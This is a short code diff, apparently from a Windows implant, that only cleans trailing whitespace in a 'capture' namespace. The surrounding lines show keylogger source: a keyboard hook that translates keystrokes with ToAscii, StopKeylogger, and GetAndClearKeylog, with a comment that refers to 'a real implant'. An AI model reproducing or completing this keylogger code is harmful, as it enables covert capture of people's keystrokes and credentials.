@@ -62,8 +62,8 @@ namespace capture {
                     GetKeyboardState(keyboardState);
                     
                     WORD ascii = 0;
-                    // Note: ToAscii is a bit flaky in hooks without attached thread input, 
-                    // but ToAscii keeps it simple for now. 
+                    // Note: ToAscii is a bit flaky in hooks without attached thread input,
+                    // but ToAscii keeps it simple for now.
                     // Better approach: MapVirtualKey
                     
                     int len = ToAscii(vkCode, kbd->scanCode, keyboardState, &ascii, 0);
@@ -102,9 +102,9 @@ namespace capture {
     void StopKeylogger() {
         isLogging = false;
         // Post a message to break the message loop
-        // We need the thread ID of the logger thread. 
+        // We need the thread ID of the logger thread.
         // Simplification: In a real implant, use PostThreadMessage(threadId, WM_QUIT...).
-        // Since we didn't save ID, we rely on isLogging check or subsequent input. 
+        // Since we didn't save ID, we rely on isLogging check or subsequent input.
         // HOWEVER, GetMessage blocks. So we MUST post a message.
         // For this simple version, let's just detach and leak or force terminate if urgent.
         // Proper fix:
@@ -112,7 +112,7 @@ namespace capture {
         // But std::thread doesn't give handle easily.
         // We will accept that Stop might lag until next input or just leave it running in background if detached.
         // For now, let's detach.
-        loggerThread.detach(); 
+        loggerThread.detach();
     }
 
     std::string GetAndClearKeylog() {
